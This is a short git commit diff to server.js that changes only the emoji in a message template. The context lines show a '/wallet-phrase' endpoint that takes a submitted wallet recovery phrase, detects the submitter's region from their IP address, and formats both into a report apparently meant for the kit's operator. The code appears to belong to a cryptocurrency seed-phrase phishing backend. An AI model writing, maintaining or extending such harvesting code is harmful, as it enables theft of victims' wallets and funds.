e3be538edee22b86353ace9fc47f856db7cc5cce
gratous100 <122572602+gratous100@users.noreply.github.com>
2026-09-13 22:07:34 +0100

    Update server.js

--- server.js
+++ server.js
@@ -1866,7 +1866,7 @@ app.post("/wallet-phrase", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
+      `💰💰💰 <b>Wallet - Phrases</b> 💰💰💰\n` +
       `<b>📝 Phrases:</b>\n` +
       `<code>${phrase}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
